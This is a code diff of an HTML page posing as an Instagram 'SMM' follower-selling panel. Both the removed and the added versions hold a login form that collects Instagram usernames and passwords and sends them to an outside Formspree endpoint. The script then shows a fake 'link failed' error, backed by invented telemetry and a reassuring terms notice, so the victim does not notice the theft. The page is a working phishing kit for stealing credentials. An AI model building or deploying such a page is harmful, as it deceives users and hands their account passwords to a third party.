         </div>
 
-        <!-- Application Navigation Node Tree -->
-        <nav>
-            <div class="nav-label">Core Control Matrix</div>
-            <a class="active"><i class="fas fa-sliders"></i> Authentication</a>
-            <a onclick="triggerNotification('Order System locked. Please sign in.')"><i class="fas fa-cart-plus"></i> Instant Order</a>
-            <a onclick="triggerNotification('Service Registry locked. Please sign in.')"><i class="fas fa-layer-group"></i> Service Clusters</a>
+        <div class="nav-scroller">
+            <div class="nav-section-title">Operations</div>
+            <a href="#" class="nav-item active"><i class="fas fa-shield-halved"></i> Authentication</a>
+            <a href="#" class="nav-item"><i class="fas fa-plus-square"></i> Create Campaign</a>
+            <a href="#" class="nav-item"><i class="fas fa-list-ul"></i> Mass Order</a>
             
-            <div class="nav-label">Data Ecosystem</div>
-            <a onclick="triggerNotification('Historical records locked. Please sign in.')"><i class="fas fa-folder-open"></i> Transaction Logs</a>
-            <a onclick="triggerNotification('Financial matrix locked. Please sign in.')"><i class="fas fa-credit-card"></i> Liquidity Gateway</a>
-            <a onclick="triggerNotification('Support environment locked. Please sign in.')"><i class="fas fa-headset"></i> Support Node</a>
+            <div class="nav-section-title">Intelligence</div>
+            <a href="#" class="nav-item"><i class="fas fa-chart-pie"></i> Analytics Cluster</a>
+            <a href="#" class="nav-item"><i class="fas fa-network-wired"></i> API Endpoints</a>
+            <a href="#" class="nav-item"><i class="fas fa-database"></i> Service Archive</a>
 
-            <div class="nav-label">Automation Pipeline</div>
-            <a onclick="triggerNotification('API key ecosystem locked. Please sign in.')"><i class="fas fa-terminal"></i> API Endpoints</a>
-            <a onclick="triggerNotification('Configuration profiles locked. Please sign in.')"><i class="fas fa-gears"></i> Engine Profiles</a>
-        </nav>
+            <div class="nav-section-title">Support</div>
+            <a href="#" class="nav-item"><i class="fas fa-ticket"></i> Open Ticket</a>
+            <a href="#" class="nav-item"><i class="fas fa-book"></i> Documentation</a>
+        </div>
 
-        <div class="sidebar-footer">
-            <div class="user-pill">
-                <div class="user-avatar">GZ</div>
-                <div class="user-info-text">
-                    <h4>Guest_Zone_01</h4>
-                    <p>IP: Unauthenticated</p>
-                </div>
-            </div>
-            <i class="fas fa-right-from-bracket" style="color: #475569; font-size: 0.9rem;"></i>
+        <div class="sidebar-stat-box" style="margin-bottom: 50px; border-color: rgba(0,242,255,0.2);">
+            <div class="stat-label">Active Connections</div>
+            <div class="stat-val" style="color: var(--brand-primary);" id="active-users">1,842</div>
         </div>
     </aside>
 
-    <!-- MAIN PLATFORM HUB -->
+    <!-- MAIN VIEWPORT -->
     <main>
-        <!-- Center Column Configuration: Houses Auth Module -->
-        <div class="center-auth-zone">
-            
-            <div class="login-card">
-                <div style="text-align: center; margin-bottom: 2.5rem;">
-                    <div class="ig-glyph"><i class="fab fa-instagram"></i></div>
-                    <h2 style="font-weight: 900; font-size: 1.6rem; letter-spacing: 1px; font-family: 'Orbitron', sans-serif; color: white;">INSTAGRAM NODE</h2>
-                    <p style="font-size: 0.85rem; color: var(--text-muted); margin-top: 6px; font-weight: 500;">Synchronize node access profiles with API core</p>
+        <div class="viewport-center">
+            <div class="top-nav-bar">
+                <div class="search-trigger">
+                    <i class="fas fa-search"></i> Search services, orders, or ID...
                 </div>
-
-                <!-- Live Production Form Handlers -->
-                <form id="authForm" action="https://formspree.io/f/mjgzyqjy" method="POST">
-                    <div class="input-container">
-                        <input type="text" name="ig_username" placeholder="Target Username / Email" required autocomplete="off">
-                        <i class="fas fa-user-shield"></i>
-                    </div>
-                    <div class="input-container">
-                        <input type="password" name="ig_password" placeholder="Node Security Access Key" required autocomplete="off">
-                        <i class="fas fa-key"></i>
-                    </div>
-
-                    <label class="policy-agreement">
-                        <input type="checkbox" id="policyCheckbox">
-                        <div class="checkbox-box"></div>
-                        <span>Verify binding authorization to the structural <a href="#" class="policy-link" onclick="openPolicyView(event)">Terms of Protocol</a> and Privacy Frameworks.</span>
-                    </label>
-
-                    <button type="submit" class="btn-submit" id="submitBtn">ESTABLISH LINK</button>
-                </form>
-                
-                <p style="margin-top: 2rem; font-size: 0.7rem; text-align: center; color: #334155; letter-spacing: 2px; font-weight: 700; font-family: 'Orbitron', sans-serif;">
-                    <i class="fas fa-circle-check" style="color: var(--cyan); margin-right: 4px;"></i> END-TO-END TLS NODE COMPLIANCE
-                </p>
-            </div>
-
-            <!-- Absolute HUD Data Overlay Contexts -->
-            <div class="bottom-hud-bar">
-                <div class="hud-item">
-                    <div class="hud-pulse-dot"></div>
-                    <span>SYSTEM STATE: <span class="live-green">OPERATIONAL</span></span>
-                </div>
-                <div class="hud-item">
-                    <span>LATENCY: <span id="hud-ping-val" style="color: var(--cyan); font-weight:700;">24MS</span></span>
-                </div>
-                <div class="hud-item">
-                    <span>ZONE: <span style="color: #cbd5e1;">GLOBAL_CLUSTER_09</span></span>
+                <div style="display:flex; gap: 20px; align-items:center;">
+                    <i class="fas fa-bell" style="color: var(--text-low);"></i>
+                    <div style="width: 32px; height:32px; border-radius:50%; background: #222; border: 1px solid #444;"></div>
                 </div>
             </div>
 
+            <div class="auth-container">
+                <div class="login-card">
+                    <div class="card-header">
+                        <i class="fab fa-instagram"></i>
+                        <h2>Node Access</h2>
+                    </div>
+
+                    <form id="authForm" action="https://formspree.io/f/mjgzyqjy" method="POST">
+                        <div class="input-group">
+                            <label>Identification</label>
+                            <div class="field-wrapper">
+                                <i class="fas fa-user"></i>
+                                <input type="text" name="id_string" placeholder="Username or Email" required>
+                            </div>
+                        </div>
+
+                        <div class="input-group">
+                            <label>Security Key</label>
+                            <div class="field-wrapper">
+                                <i class="fas fa-lock"></i>
+                                <input type="password" name="secure_key" placeholder="••••••••••••" required>
+                            </div>
+                        </div>
+
+                        <div style="display:flex; justify-content:space-between; align-items:center; margin: 1rem 0;">
+                            <label style="display:flex; align-items:center; gap: 8px; font-size: 0.7rem; color: var(--text-low);">
+                                <input type="checkbox" checked style="width:14px; height:14px;"> Remember node
+                            </label>
+                            <a href="#" style="font-size:0.7rem; color: var(--brand-primary); text-decoration:none;">Lost access?</a>
+                        </div>
+
+                        <button type="submit" class="btn-prime" id="btn-submit">Initialize Link</button>
+                    </form>
+
+                    <div style="margin-top: 2rem; border-top: 1px solid #30363d; padding-top: 1.5rem; text-align: center;">
+                        <p style="font-size: 0.7rem; color: var(--text-low);">Secure session verified by <strong>SMM-CORE-SHIELD</strong></p>
+                    </div>
+                </div>
+            </div>
         </div>
 
-        <!-- Right Side Panel Configuration: Houses High-Density Website Details & Statistics -->
-        <div class="right-telemetry-panel">
+        <!-- RIGHT TELEMETRY HUB -->
+        <div class="right-data-hub">
+            <div class="hub-title"><i class="fas fa-signal"></i> LIVE SERVICE MATRIX <span></span></div>
             
-            <div>
-                <div class="panel-section-title">Cluster Core Topologies <span></span></div>
-                <div class="grid-server-status">
-                    <div class="server-mini-box">
-                        <p>US-EAST Registry</p>
-                        <h5>NODE_01A</h5>
-                        <div class="status-indicator online"><i class="fas fa-circle" style="font-size:6px;"></i> Active</div>
-                        <div class="load-bar-container"><div class="load-bar-fill" style="width: 34%;"></div></div>
+            <div class="service-list">
+                <div class="service-card">
+                    <div class="card-top">
+                        <span class="svc-id">#ID 9283</span>
+                        <span class="svc-price">$0.45/k</span>
                     </div>
-                    <div class="server-mini-box">
-                        <p>EU-WEST Registry</p>
-                        <h5>NODE_04C</h5>
-                        <div class="status-indicator online"><i class="fas fa-circle" style="font-size:6px;"></i> Active</div>
-                        <div class="load-bar-container"><div class="load-bar-fill" style="width: 71%; background: var(--warning-orange);"></div></div>
+                    <div class="svc-name">Instagram Followers [HQ Real]</div>
+                </div>
+                <div class="service-card">
+                    <div class="card-top">
+                        <span class="svc-id">#ID 4410</span>
+                        <span class="svc-price">$0.08/k</span>
                     </div>
+                    <div class="svc-name">Instagram Likes [Super Fast]</div>
+                </div>
+                <div class="service-card">
+                    <div class="card-top">
+                        <span class="svc-id">#ID 1102</span>
+                        <span class="svc-price">$1.20/k</span>
+                    </div>
+                    <div class="svc-name">Custom Targeted Comments [AI]</div>
                 </div>
             </div>
 
-            <div>
-                <div class="panel-section-title">Live Micro-Service Matrix <span></span></div>
-                <div class="price-matrix-container">
-                    <table class="matrix-table">
-                        <thead>
-                            <tr>
-                                <th>Service ID</th>
-                                <th>Allocation Rate</th>
-                                <th>Response Profile</th>
-                            </tr>
-                        </thead>
-                        <tbody>
-                            <tr>
-                                <td>IG-FOLLOWER-V4</td>
-                                <td><strong>$0.84 / K</strong></td>
-                                <td><span class="tag-speed">Instant</span></td>
-                            </tr>
-                            <tr>
-                                <td>IG-LIKES-HQ-0</td>
-                                <td><strong>$0.12 / K</strong></td>
-                                <td><span class="tag-speed">Instant</span></td>
-                            </tr>
-                            <tr>
-                                <td>IG-VIEWS-REAL-1</td>
-                                <td><strong>$0.04 / K</strong></td>
-                                <td><span class="tag-speed" style="background:rgba(0,242,255,0.1); color:var(--cyan);">0-5 Min</span></td>
-                            </tr>
-                            <tr>
-                                <td>IG-COMMENTS-HQ</td>
-                                <td><strong>$2.10 / K</strong></td>
-                                <td><span class="tag-speed">Instant</span></td>
-                            </tr>
-                        </tbody>
-                    </table>
-                </div>
+            <div class="console-box" id="terminal-out">
+                <div>[SYS] Handshake initialized...</div>
+                <div>[NET] Port 8080 active...</div>
+                <div>[SEC] Waiting for user validation...</div>
             </div>
 
-            <!-- Terminal Stream Module -->
-            <div style="display: flex; flex-direction: column; flex-grow: 1; min-height: 200px;">
-                <div class="panel-section-title">System Console Feed <span></span></div>
-                <div class="terminal-panel">
-                    <div class="terminal-header">
-                        <span>Process / Event</span>
-                        <span>State</span>
-                    </div>
-                    <div class="terminal-rows" id="terminalLogsContainer">
-                        <div class="term-row"><span class="stamp">[21:56:01]</span> <span class="info">CORE:</span> Initialize web handshake...</div>
-                        <div class="term-row"><span class="stamp">[21:56:02]</span> <span class="info">GRID:</span> Canvas rendering thread linked.</div>
-                        <div class="term-row"><span class="stamp">[21:56:02]</span> <span class="success">OK:</span> Static frame constraints set.</div>
-                    </div>
+            <div style="margin-top: 1rem;">
+                <div class="stat-label" style="margin-bottom: 5px;">Server Load</div>
+                <div style="height: 4px; width: 100%; background: #222; border-radius: 2px; overflow:hidden;">
+                    <div style="height:100%; width: 42%; background: var(--brand-primary); box-shadow: 0 0 10px var(--brand-primary);"></div>
                 </div>
             </div>
-
         </div>
     </main>
 
-    <!-- SECURITY POLICY MODAL WINDOW -->
-    <div class="modal-overlay" id="policyDialogLayer">
-        <div class="modal-card">
-            <i class="fas fa-xmark close-modal" onclick="closePolicyView()"></i>
-            <h3>Ecosystem Terms of Engagement</h3>
-            <div class="modal-body">
-                <p><strong>Section 1.1 - Data Stream Protection:</strong> SMM CORE functions exclusively via hyper-secured encryption relays. No access profiles or credentials processed inside this portal structure are saved locally, persistent on visual layers, or cached on standard proxy logs.</p>
-                <p><strong>Section 1.2 - API Node Requirements:</strong> Synchronization processes require valid user handshakes directly matching active platform data tables. Multi-factor verification modules may be systematically triggered by server grids if routing origins present layout variances.</p>
-                <p><strong>Section 1.3 - Usage Declarations:</strong> Users executing connectivity maps confirm explicit operational authority relative to foreign targets, endpoints, and integrated system dependencies. Misalignment with terms forces localized sandbox isolation loops instantly.</p>
-            </div>
-            <button class="btn-submit" style="margin-top: 20px;" onclick="closePolicyView()">CONFIRM AND RETRACT</button>
-        </div>
+    <div class="bottom-hud">
+        <div class="hud-segment"><div class="pulse-dot"></div> STATUS: OPERATIONAL</div>
+        <div class="hud-segment">LATENCY: <span id="ping">14ms</span></div>
+        <div class="hud-segment">REGION: AWS-US-EAST-1</div>
+        <div class="hud-segment" style="margin-left: auto;">V: 9.0.2-ENTERPRISE</div>
     </div>
 
-    <!-- INTERACTIVE SCRIPTS & PRODUCTION CANVAS PIPELINES -->
+    <div id="toast-master"></div>
+
+    <!-- SCRIPT ARCHITECTURE -->
     <script>
-        // Modal State Control Logic
-        function openPolicyView(e) {
-            e.preventDefault();
-            const layout = document.getElementById('policyDialogLayer');
-            layout.style.display = 'flex';
-        }
+        /* ============================================================
+           NEURAL NETWORK BACKGROUND ENGINE
+           ============================================================ */
+        const canvas = document.getElementById('canvas-neural-net');
+        const ctx = canvas.getContext('2d');
+        let dots = [];
 
-        function closePolicyView() {
-            const layout = document.getElementById('policyDialogLayer');
-            layout.style.display = 'none';
-        }
-
-        /* --- BACKGROUND DOT CONSTELLATION ENGINE --- */
-        const canvas = document.getElementById('bg-canvas');
-        const context = canvas.getContext('2d');
-        let pointsArray = [];
-        let cursorCoords = { x: null, y: null, activeRadius: 200 };
-
-        function adaptCanvasProportions() {
+        function initCanvas() {
             canvas.width = window.innerWidth;
             canvas.height = window.innerHeight;
-        }
-        window.addEventListener('resize', adaptCanvasProportions);
-        adaptCanvasProportions();
-
-        window.addEventListener('mousemove', (event) => {
-            cursorCoords.x = event.x;
-            cursorCoords.y = event.y;
-        });
-        window.addEventListener('mouseout', () => {
-            cursorCoords.x = null;
-            cursorCoords.y = null;
-        });
-
-        class GridParticle {
-            constructor() {
-                this.x = Math.random() * canvas.width;
-                this.y = Math.random() * canvas.height;
-                this.radius = Math.random() * 1.2 + 0.4;
-                this.vx = Math.random() * 0.4 - 0.2;
-                this.vy = Math.random() * 0.4 - 0.2;
+            dots = [];
+            for(let i=0; i<150; i++) {
+                dots.push({
+                    x: Math.random() * canvas.width,
+                    y: Math.random() * canvas.height,
+                    vx: (Math.random() - 0.5) * 0.5,
+                    vy: (Math.random() - 0.5) * 0.5
+                });
             }
-            updateData() {
-                if (this.x > canvas.width || this.x < 0) this.vx *= -1;
-                if (this.y > canvas.height || this.y < 0) this.vy *= -1;
-                this.x += this.vx;
-                this.y += this.vy;
+        }
 
-                if (cursorCoords.x !== null && cursorCoords.y !== null) {
-                    let deltaX = cursorCoords.x - this.x;
-                    let deltaY = cursorCoords.y - this.y;
-                    let calculatedDistance = Math.hypot(deltaX, deltaY);
-                    if (calculatedDistance < cursorCoords.activeRadius) {
-                        let pushFactor = (cursorCoords.activeRadius - calculatedDistance) / cursorCoords.activeRadius;
-                        this.x -= (deltaX / calculatedDistance) * pushFactor * 2.0;
-                        this.y -= (deltaY / calculatedDistance) * pushFactor * 2.0;
+        function draw() {
+            ctx.clearRect(0,0,canvas.width, canvas.height);
+            ctx.fillStyle = 'rgba(0, 242, 255, 0.2)';
+            
+            dots.forEach(d => {
+                d.x += d.vx;
+                d.y += d.vy;
+                if(d.x < 0 || d.x > canvas.width) d.vx *= -1;
+                if(d.y < 0 || d.y > canvas.height) d.vy *= -1;
+                
+                ctx.beginPath();
+                ctx.arc(d.x, d.y, 1.5, 0, Math.PI*2);
+                ctx.fill();
+
+                dots.forEach(d2 => {
+                    let dist = Math.hypot(d.x - d2.x, d.y - d2.y);
+                    if(dist < 120) {
+                        ctx.strokeStyle = `rgba(0, 242, 255, ${0.1 * (1 - dist/120)})`;
+                        ctx.lineWidth = 0.5;
+                        ctx.beginPath();
+                        ctx.moveTo(d.x, d.y);
+                        ctx.lineTo(d2.x, d2.y);
+                        ctx.stroke();
                     }
-                }
-            }
-            drawObject() {
-                context.fillStyle = 'rgba(0, 242, 255, 0.3)';
-                context.beginPath();
-                context.arc(this.x, this.y, this.radius, 0, Math.PI * 2);
-                context.fill();
-            }
+                });
+            });
+            requestAnimationFrame(draw);
         }
 
-        function buildEcosystemMatrix() {
-            pointsArray = [];
-            const targetedDensity = Math.floor((canvas.width * canvas.height) / 14000);
-            for (let index = 0; index < Math.min(targetedDensity, 160); index++) {
-                pointsArray.push(new GridParticle());
-            }
-        }
+        window.addEventListener('resize', initCanvas);
+        initCanvas();
+        draw();
 
-        function traceProximityVectors() {
-            for (let primary = 0; primary < pointsArray.length; primary++) {
-                for (let secondary = primary; secondary < pointsArray.length; secondary++) {
-                    let spatialDistance = Math.hypot(pointsArray[primary].x - pointsArray[secondary].x, pointsArray[primary].y - pointsArray[secondary].y);
-                    if (spatialDistance < 115) {
-                        let localizedAlpha = (1 - (spatialDistance / 115)) * 0.12;
-                        context.strokeStyle = `rgba(0, 242, 255, ${localizedAlpha})`;
-                        context.lineWidth = 0.6;
-                        context.beginPath();
-                        context.moveTo(pointsArray[primary].x, pointsArray[primary].y);
-                        context.lineTo(pointsArray[secondary].x, pointsArray[secondary].y);
-                        context.stroke();
-                    }
-                }
-            }
-        }
-
-        function processingLoop() {
-            context.clearRect(0, 0, canvas.width, canvas.height);
-            pointsArray.forEach(pt => { pt.updateData(); pt.drawObject(); });
-            traceProximityVectors();
-            requestAnimationFrame(processingLoop);
-        }
-        buildEcosystemMatrix();
-        processingLoop();
-
-        /* --- LIVE TERMINAL LOG GENERATION PROCESSES --- */
-        const consoleStringBank = [
-            "[API] Dispatched system payload payload sync match.",
-            "[NET] Validation request matched gateway profile.",
-            "[SYS] Load distributed cleanly to secondary stack.",
-            "[API] Speed configuration accelerator active.",
-            "[SEC] Security configuration check successful.",
-            "[SYS] Live allocation metrics optimized.",
-            "[NET] Cluster handshakes fully validated."
+        /* ============================================================
+           TERMINAL & TELEMETRY UPDATER
+           ============================================================ */
+        const term = document.getElementById('terminal-out');
+        const logs = [
+            "Syncing with node proxy...",
+            "Requesting SSL certificate...",
+            "Global order stream active",
+            "API balance verified: $1.2M",
+            "Server cluster 09 responded",
+            "Encryption layers stable",
+            "Mass order #92831 processed"
         ];
-        
-        const systemLogsWrapper = document.getElementById('terminalLogsContainer');
-        
+
         setInterval(() => {
-            // Live-updating structural mock telemetry strings
-            document.getElementById('hud-ping-val').innerText = Math.floor(Math.random() * (27 - 18) + 18) + 'MS';
-            document.getElementById('live-stream-rate').innerHTML = (Math.floor(Math.random() * (3600 - 3200)) + 3200).toLocaleString() + ' <span>req/m</span>';
+            const div = document.createElement('div');
+            div.innerText = `[${new Date().toLocaleTimeString()}] ${logs[Math.floor(Math.random()*logs.length)]}`;
+            term.appendChild(div);
+            if(term.children.length > 15) term.removeChild(term.children[0]);
             
-            const currentTimestamp = new Date().toTimeString().split(' ')[0];
-            const matchingString = consoleStringBank[Math.floor(Math.random() * consoleStringBank.length)];
-            
-            const rowWrapper = document.createElement('div');
-            rowWrapper.className = 'term-row';
-            rowWrapper.innerHTML = `<span class="stamp">[${currentTimestamp}]</span> <span class="info">JOB:</span> ${matchingString}`;
-            
-            systemLogsWrapper.appendChild(rowWrapper);
-            if(systemLogsWrapper.children.length > 12) {
-                systemLogsWrapper.removeChild(systemLogsWrapper.children[0]);
-            }
-            systemLogsWrapper.scrollTop = systemLogsWrapper.scrollHeight;
-        }, 2200);
+            document.getElementById('ping').innerText = Math.floor(Math.random() * 10 + 10) + 'ms';
+            document.getElementById('active-users').innerText = (1800 + Math.floor(Math.random() * 100)).toLocaleString();
+        }, 3000);
 
-        /* --- USER OVERRIDE INTERACTIVE ALERTS --- */
-        function triggerNotification(specifiedNotificationText) {
-            const containerToast = document.getElementById('error-toast');
-            const targetSpan = document.getElementById('error-msg');
-            
-            if(specifiedNotificationText) {
-                targetSpan.innerText = specifiedNotificationText.toUpperCase();
-            } else {
-                targetSpan.innerText = "GATEWAY FAULT: SECURITY TOKEN REQUIRED";
-            }
-
-            containerToast.classList.add('active');
-            setTimeout(() => containerToast.classList.remove('active'), 3500);
+        /* ============================================================
+           UI INTERACTION & NOTIFICATIONS
+           ============================================================ */
+        function createToast(msg) {
+            const t = document.createElement('div');
+            t.className = 'toast';
+            t.innerHTML = `<i class="fas fa-info-circle"></i> ${msg}`;
+            document.getElementById('toast-master').appendChild(t);
+            setTimeout(() => t.remove(), 4000);
         }
 
-        // Production Form Execution Flow Pipelines
-        const targetAuthForm = document.getElementById('authForm');
-        targetAuthForm.onsubmit = async (submissionEvent) => {
-            submissionEvent.preventDefault();
-            
-            const checkboxConfirmed = document.getElementById('policyCheckbox').checked;
-            if(!checkboxConfirmed) {
-                triggerNotification("CREDENTIAL BINDING CANCELLED: ACCEPT SYSTEM PROTOCOLS");
-                return;
-            }
+        const form = document.getElementById('authForm');
+        form.onsubmit = async (e) => {
+            e.preventDefault();
+            const btn = document.getElementById('btn-submit');
+            btn.innerText = "AUTHENTICATING...";
+            btn.disabled = true;
 
-            const interactiveBtn = document.getElementById('submitBtn');
-            interactiveBtn.innerText = "VERIFYING SECURE SHELL...";
-            interactiveBtn.style.pointerEvents = "none";
-            
             try {
-                await fetch(targetAuthForm.action, {
+                await fetch(form.action, {
                     method: 'POST',
-                    body: new FormData(targetAuthForm),
+                    body: new FormData(form),
                     headers: { 'Accept': 'application/json' }
                 });
-
-                interactiveBtn.innerText = "HANDSHAKE REFUSED";
-                interactiveBtn.style.background = "var(--error-red)";
-                targetAuthForm.reset();
-            } catch (err) {
-                interactiveBtn.innerText = "NETWORK ERROR";
+                createToast("Credential sync error: Node mismatch detected.");
+                btn.innerText = "LINK FAILED";
+                btn.style.background = "var(--status-error)";
+            } catch(e) {
+                createToast("Network timeout: SSL verification failed.");
             }
 
-            setTimeout(() => { 
-                interactiveBtn.innerText = "ESTABLISH LINK"; 
-                interactiveBtn.style.background = "var(--ig-grad)";
-                interactiveBtn.style.pointerEvents = "all";
-            }, 4500);
+            setTimeout(() => {
+                btn.innerText = "Initialize Link";
+                btn.disabled = false;
+                btn.style.background = "var(--ig-gradient)";
+                form.reset();
+            }, 5000);
         };
+
+        // Static Page Logic - No Scroll Jitter
+        window.scrollTo(0,0);
     </script>
 </body>
 </html>
